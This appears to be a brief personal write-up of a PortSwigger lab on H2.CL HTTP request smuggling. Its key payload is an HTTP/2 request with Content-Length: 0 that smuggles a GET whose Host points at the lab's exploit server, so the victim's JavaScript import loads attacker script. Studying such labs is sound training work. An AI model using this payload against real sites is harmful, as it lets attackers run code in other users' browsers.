# [H2.CL request smuggling] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-26
 
---
 
## Vulnerability / core concept
HTTP Request Smuggling

---


## Payload / key command
In this lab victim's browser tries to import a JS resource. We need to prepend our smuggled request to it so it redirects to our exploit server which executes malicious javascript file:
```bash
POST / HTTP/2
Host: 0a9b001004b224a0835be11a000b00d6.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0abf005f045d24b083bae0fd01b0008f.exploit-server.net
Content-Length: 5

x=1
```
